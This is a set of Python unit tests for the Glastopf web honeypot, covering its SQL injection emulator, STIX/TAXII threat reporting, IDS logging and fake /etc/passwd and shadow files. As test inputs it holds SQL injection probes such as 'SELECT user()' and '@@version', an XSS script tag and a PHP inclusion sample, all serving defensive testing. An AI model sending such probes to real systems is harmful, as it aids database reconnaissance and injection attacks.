        attack_event.http_request = HTTPHandler(request, None)

        #insert attack event
        maindb.insert(attack_event)

        #try to extract event from the database
        sql = "SELECT * FROM events"
        results = sqla_engine.connect().execute(sql).fetchall()
        #Check if database returned the correct amount
        self.assertEqual(len(list(results)), 1)
        print results[0]
        entry = results[0]
        #check basic attributes
        #time
        self.assertEqual(entry[1], timestamp)
        #source
        self.assertEqual(entry[2], "192.168.1.201:12345")
        #request_url
        self.assertEqual(entry[3], "/breadandbytter.php?a=b")
        #request_body
        self.assertEqual(entry[4], request)
        #pattern
        self.assertEqual(entry[5], "test_test")


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_sqli
# Copyright (C) 2013  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import os
import shutil
import tempfile

from glastopf.modules.handlers.request_handler import RequestHandler
import glastopf.modules.events.attack as attack
from glastopf.modules.HTTP.handler import HTTPHandler


class TestSQLiEmulation(unittest.TestCase):
    """Tests the honeypots SQL injection emulation module.
    We first start with the integration test and continue with unit test"""
    def setUp(self):
        self.event = attack.AttackEvent()
        self.event.http_request = HTTPHandler('GET /test.php?q=SELECT%20A%20FROM%20B', None)
        self.data_dir = tempfile.mkdtemp()

    def tearDown(self):
        del self.event
        if os.path.isdir(self.data_dir):
            shutil.rmtree(self.data_dir)

    def _get_test_request(self, attack_event):
        self.test_request = "haha"

    def test_sqli_lexer(self):
        """Objective: Tests the SQL injection lexer.
        Input: 'SELECT A FROM B'
        Expected Results:
        Notes:
        """
        self.event.matched_pattern = "sqli"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(self.event.matched_pattern)
        self._get_test_request(self.event)
        emulator.handle(self.event)
        self.assertEqual(emulator.ret["fingerprint"], "Enkn")

    def test_sqli_emulator(self):
        """Objective: Assure that the SQL injection module is integrated.
        Input: Inject 'SELECT a FROM b' in parameter q.
        Expected Results: MySQL error message.
        Notes: As there is no table b, the honeypot returns an error message."""
        self.event.matched_pattern = "sqli"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(self.event.matched_pattern)
        self._get_test_request(self.event)
        emulator.handle(self.event)
        response = "Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your " \
                   "MySQL server version for the right syntax to use near 'SELECT A FROM B' at line 1"
        self.assertEqual(self.event.http_request.get_response(), response)

    def test_sqli_error_based(self):
        """Objective: A simple query provoking an error message from the database.
        Input: Inject a single quotation mark in parameter q.
        Expected Results: MySQL syntax error message.
        Notes: The query is included in the error message."""
        self.event.matched_pattern = "sqli"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(self.event.matched_pattern)
        self.event.http_request.request_query = {
            "q": ["'"],
        }
        self._get_test_request(self.event)
        emulator.handle(self.event)
        response = "Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your " \
                   "MySQL server version for the right syntax to use near ''' at line 1"
        self.assertEqual(self.event.http_request.get_response(), response)

    def test_sqli_select_user(self):
        """Objective: A query with the goal to disclosure the current user.
        Input: SELECT user().
        Expected Results: Current SQL user name.
        Notes: This query is MySQL specific."""
        self.event.matched_pattern = "sqli"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(self.event.matched_pattern)
        self.event.http_request.request_query = {
            "q": ["SELECT user()"],
        }
        self._get_test_request(self.event)
        emulator.handle(self.event)
        response = "root@localhost"
        self.assertEqual(self.event.http_request.get_response().strip(), response)

    def test_sqli_mysqld_version(self):
        """Objective: A query with the goal to disclose the MySQL server version.
        Input: SELECT @@version.
        Expected Results: The MySQL server version number.
        Notes: The query is MySQL specific."""
        self.event.matched_pattern = "sqli"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(self.event.matched_pattern)
        self.event.http_request.request_query = {
            "q": ["SELECT @@version"],
        }
        self._get_test_request(self.event)
        emulator.handle(self.event)
        response = "5.1.49-3"
        self.assertEqual(self.event.http_request.get_response().strip(), response)

    def test_sqli_xss(self):
        """Objective: Injecting JavaScript.
        Input: '&lt;script&gt;alert("XSS");&lt;/script&gt;'
        Expected Results: MySQL syntax error message containing '&lt;script&gt;alert("XSS");&lt;/script&gt;'
        Notes: The query and identifying string is included in the error message."""
        self.event.matched_pattern = "sqli"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(self.event.matched_pattern)
        self.event.http_request.request_query = {
            'q': ['<script>alert("XSS");</script>'],
        }
        self._get_test_request(self.event)
        emulator.handle(self.event)
        self.assertTrue('<script>alert("XSS");</script>' in self.event.http_request.get_response())


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_stix
# Copyright (C) 2014  Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import os
import shutil
import tempfile
import hashlib

from StringIO import StringIO

from ConfigParser import ConfigParser

from glastopf.modules.reporting.auxiliary.stix.stix_transform import StixTransformer
from glastopf.modules.reporting.auxiliary.log_taxii import TaxiiLogger
from glastopf.testing.mitre_stix_validator import STIXValidator
from glastopf.modules.HTTP.handler import HTTPHandler
from glastopf.modules.events.attack import AttackEvent


class Test_Stix(unittest.TestCase):

    def setUp(self):
        self.config = ConfigParser()
        self.config.add_section('taxii')
        self.config.set('taxii', 'enabled', "True")
        self.config.set('taxii', 'include_contact_info', "True")
        self.config.set('taxii', 'contact_name', 'James Bond')
        self.config.set('taxii', 'contact_email', 'a@b.c')
        self.config.set('taxii', 'host', 'taxiitest.mitre.org')
        self.config.set('taxii', 'port', '80')
        self.config.set('taxii', 'inbox_path', '/services/inbox/default/')
        self.config.set('taxii', 'use_auth_basic', 'False')
        self.config.set('taxii', 'auth_basic_username', 'your_username')
        self.config.set('taxii', 'auth_basic_password', 'your_password')
        self.config.set('taxii', 'use_auth_certificate', 'False')
        self.config.set('taxii', 'auth_certificate_keyfile', 'keyfile_oath')
        self.config.set('taxii', 'auth_certificate_certfile', 'certfile_path')
        self.config.set('taxii', 'use_https', 'True')

        self.tmpdir = tempfile.mkdtemp()
        self.files_dir = os.path.join(self.tmpdir, 'files')
        os.mkdir(self.files_dir)
        self.stix_transformer = StixTransformer(self.config, self.tmpdir)
        self.xml_validator = STIXValidator(None, True, False)

    def tearDown(self):
        if os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir)

    def test_stix_transform(self):
        """
        Objective: Test if the expected XML is generated from a "unknown" attack event.
        """

        test_event = AttackEvent()
        test_event.source_addr = ('1.2.3.4', 43811)
        http_request_content = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        test_event.http_request = HTTPHandler(http_request_content, None, server_version="", sys_version="")
        stix_package_xml = self.stix_transformer.transform(test_event)

        (isvalid, validation_error, best_practice_warnings) = self.xml_validator.validate(StringIO(stix_package_xml.encode('utf-8')))
        self.assertTrue(isvalid, 'Error while parsing STIX xml: {0}'.format(validation_error))
        self.assertTrue('<HTTPSessionObj:User_Agent>test</HTTPSessionObj:User_Agent>' in stix_package_xml)
        self.assertTrue('<HTTPSessionObj:HTTP_Method datatype="string">GET</HTTPSessionObj:HTTP_Method>' in stix_package_xml)
        self.assertTrue('<HTTPSessionObj:Value>/test</HTTPSessionObj:Value>' in stix_package_xml)
        self.assertTrue('<HTTPSessionObj:Version>HTTP/1.0</HTTPSessionObj:Version>' in stix_package_xml)

    def test_stix_transform_invalid_header(self):
        """
        Objective: Test if we can generate valid XML from a HTTP request with a invalid header item.
        """

        test_event = AttackEvent()
        test_event.source_addr = ('1.2.3.4', 43811)
        http_request_content = """GET /test HTTP/1.0\r\nXUser-XAgent: test\r\n\r\n"""
        test_event.http_request = HTTPHandler(http_request_content, None, server_version="", sys_version="")
        stix_package_xml = self.stix_transformer.transform(test_event)

        (isvalid, validation_error, best_practice_warnings) = self.xml_validator.validate(StringIO(stix_package_xml.encode('utf-8')))
        self.assertTrue(isvalid, 'Error while parsing STIX xml: {0}'.format(validation_error))
        #TODO: Parse XML and check content of header, request_line, etc.

    def test_stix_transform_event_with_rfidata(self):
        """
        Objective: Test if the expected XML is generated from a "unknown" attack event.
        """

        rfi_data = """<?php echo "<script>alert("test");</script>";?>"""
        rfi_md5 = hashlib.md5(rfi_data).hexdigest()
        with open(os.path.join(self.files_dir, rfi_md5), 'w') as rfi_file:
            rfi_file.writelines(rfi_data)

        test_event = AttackEvent()
        test_event.source_addr = ('1.2.3.4', 43811)
        test_event.matched_pattern = 'rfi'
        test_event.file_name = rfi_md5
        http_request_content = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        test_event.http_request = HTTPHandler(http_request_content, None, server_version="", sys_version="")
        stix_package_xml = self.stix_transformer.transform(test_event)
        (isvalid, validation_error, best_practice_warnings) = self.xml_validator.validate(StringIO(stix_package_xml.encode('utf-8')))
        self.assertTrue(isvalid, 'Error while parsing STIX xml: {0}'.format(validation_error))
        self.assertTrue('<cyboxCommon:Simple_Hash_Value>0e209064ee6949f6e57b3d77d5b1f92c</cyboxCommon:Simple_Hash_Value>' in stix_package_xml)
        self.assertTrue('<cyboxCommon:Simple_Hash_Value>11a2a92d391f10821dbb90f1f7e6ae0f2374231e0ccd611665c95d6d7a3bb43c</cyboxCommon:Simple_Hash_Value>' in stix_package_xml)
        self.assertTrue('<ArtifactObj:Raw_Artifact datatype="string"><![CDATA[PD9waHAgZWNobyAiPHNjcmlwdD5hbGVydCgidGVzdCIpOzwvc2NyaXB0PiI7Pz4=]]></ArtifactObj:Raw_Artifact>' in stix_package_xml)

    def test_taxii_connectivity(self):
        """
        Objective: Test if we can send a message to mitre's test TAXII server.
        """
        self.config.set('taxii', 'use_https', 'False')
        test_event = AttackEvent()
        test_event.source_addr = ('1.2.3.4', 43811)
        http_request_content = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        test_event.http_request = HTTPHandler(http_request_content, None, server_version="", sys_version="")

        taxiiLogger = TaxiiLogger(self.tmpdir, self.config)
        taxii_result = taxiiLogger.insert(test_event)
        # TaxiiLogger returns false if the message could not be delivered
        self.assertTrue(taxii_result)

    def test_taxii_connectivity_https(self):
        """
        Objective: Test if we can send a message to mitre's test TAXII server using https.
        """
        self.config.set('taxii', 'use_https', 'True')
        test_event = AttackEvent()
        test_event.source_addr = ('1.2.3.4', 43811)
        http_request_content = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        test_event.http_request = HTTPHandler(http_request_content, None, server_version="", sys_version="")

        taxiiLogger = TaxiiLogger(self.tmpdir, self.config)
        taxii_result = taxiiLogger.insert(test_event)
        # TaxiiLogger returns false if the message could not be delivered
        self.assertTrue(taxii_result)


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_surface
# Copyright (C) 2013  Lukas Rist <glaslos@gmail.com>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
import tempfile
import shutil
import unittest

from glastopf.glastopf import GlastopfHoneypot
from glastopf.modules.handlers.emulators.surface import create_surface


class TestSurfaceCreation(unittest.TestCase):

    def setUp(self):
        self.workdir = tempfile.mkdtemp()
        self.datadir = os.path.join(self.workdir, 'data')
        GlastopfHoneypot.prepare_environment(self.workdir)

    def tearDown(self):
        shutil.rmtree(self.workdir)

    def test_template(self):
        surface_creator = create_surface.SurfaceCreator(data_dir=self.datadir)
        print surface_creator.get_index()


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_surfcertids
# Copyright (C) 2013 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import os
import shutil
import tempfile

from glastopf.testing import helpers
from glastopf.modules.events.attack import AttackEvent
from glastopf.modules.HTTP.handler import HTTPHandler
from glastopf.modules.reporting.auxiliary.log_surfcertids import LogSURFcertIDS


class Test_Loggers(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        if os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir)

    def test_surfcertids(self):
        """Objective: Testing if a basic event can be transmitted using hpfriends."""

        config_file = tempfile.mkstemp()[1]
        with open(config_file, 'w') as f:
            f.writelines(helpers.gen_config(''))

        try:
            attack_event = AttackEvent()
            request = "GET /pub/WWW/TheProject.html HTTP/1.1\r\n" \
            "Host: www.evil.org\r\n" \
            "Referer: http://www.honeynet.org\r\n" \
            "User-Agent:  Mozilla 5\r\n" \
            "\r\n\r\n" \
            "GET /beer\r\n"

            attack_event.http_request = HTTPHandler(request, "1.2.3.4")
            attack_event.source_addr = ('4.3.2.1', 41022)
            logSURFcertIDS = LogSURFcertIDS(None, config_file)
            logSURFcertIDS.connection = connectionMock()
        finally:
            if os.path.isfile(config_file):
                os.remove(config_file)


class connectionMock(object):
    class cursorMock(object):
        def execute(self, sql_statement, something):
            pass

        def fetchall(self):
            return [1, 2, 3, 4]

        def close(self):
            pass

    def commit(self):
        pass

    def cursor(self):
        return self.cursorMock()


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_vdocs
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import hashlib
import shutil
import os
import tempfile
import random

from glastopf.modules import vdocs


class TestVirtualDocs(unittest.TestCase):

    def test_virtualdocs(self):
        """Objective: Test for the creation of random files in the virtual directories
        Input: Return value from GlastopfHoneypot.randomize_vdocs()
        Expected Result: Two runs of GlastopfHoneypot.randomize_vdocs() have different results
        Notes:"""
        v_files = ("shadow", "passwd", "group")
        f_dir1 = tempfile.mkdtemp()
        f_dir2 = tempfile.mkdtemp()
        os.makedirs(os.path.join(f_dir1, "linux/etc"))
        os.makedirs(os.path.join(f_dir2, "linux/etc"))
        vdocs.randomize_vdocs(f_dir1)
        vdocs.randomize_vdocs(f_dir2)
        for v_file in v_files:
            file_1 = open(os.path.join(f_dir1, "linux/etc/", v_file), "r")
            file_2 = open(os.path.join(f_dir2, "linux/etc/", v_file), "r")
            md5_1 = hashlib.md5(file_1.read()).hexdigest()
            md5_2 = hashlib.md5(file_2.read()).hexdigest()
            file_1.close()
            file_2.close()
            self.assertNotEqual(md5_1, md5_2)
        shutil.rmtree(f_dir1)
        shutil.rmtree(f_dir2)

    def test_get_entry(self):
        """Objective: Test if the entries generated by the '_get_entry()'different.
        Input: Return value from GlastopfHoneypot._get_entry()
        Expected Result: Two runs of GlastopfHoneypot._get_entry() generate different results
        Notes:"""
        user_id1 = random.randint(1000, 1500)  # Realistic user ID
        pwd_entry1, shd_entry1, grp_entry1 = vdocs._get_entry(user_id1)
        user_id2 = random.randint(1000, 1500)
        pwd_entry2, shd_entry2, grp_entry2 = vdocs._get_entry(user_id2)
        self.assertNotEqual(pwd_entry1, pwd_entry2)
        self.assertNotEqual(shd_entry1, shd_entry2)
        self.assertNotEqual(grp_entry1, grp_entry2)


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = wsgi_wrapper
# Copyright (C) 2013  Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.


from webob import Request, Response


class GlastopfWSGI(object):
    def __init__(self, honeypot):
        self.honeypot = honeypot

    def remove_hop_by_hop_headers(self, headers):
        """
        Removes hop-by-hop headers from a dictionary of headers.
        """
        hop_by_hop_names = ("connection", "keep-alive", "proxy-authenticate",
                            "proxy-authorization", "te", "trailers",
                            "transfer-encoding", "upgrade")

        for header in hop_by_hop_names:
            if header in headers:
                del headers[header]

    def application(self, environ, start_response):
        req_webob = Request(environ)
        res_webob = Response()

        #addr tuple as glastopf expects it
        remote_addr = (req_webob.remote_addr, int(environ["REMOTE_PORT"]))
        if "SERVER_NAME" in environ and "SERVER_PORT" in environ:
            # we could use socket.gethostbyname to get the ip...
            sensor_addr = (environ["SERVER_NAME"], environ["SERVER_PORT"])
        else:
            sensor_addr = ("", "")

        header, body = self.honeypot.handle_request(req_webob.as_text(),
                                                         remote_addr, sensor_addr)
        for h in header.splitlines():
            if ":" in h:
                h, v = h.split(":", 1)
                res_webob.headers[str(h.strip())] = str(v.strip())
        # this will adjust content-length header
        res_webob.charset = "utf8"
        res_webob.text = body.decode("utf-8", "ignore")

        #WSGI applications are not allowed to create or modify hop-by-hop headers
        self.remove_hop_by_hop_headers(res_webob.headers)
        return res_webob(environ, start_response)

########NEW FILE########
